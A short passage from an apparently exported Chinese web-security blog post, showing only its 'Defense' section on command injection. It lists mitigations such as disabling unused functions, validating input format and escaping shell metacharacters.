+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>web渗透</category>
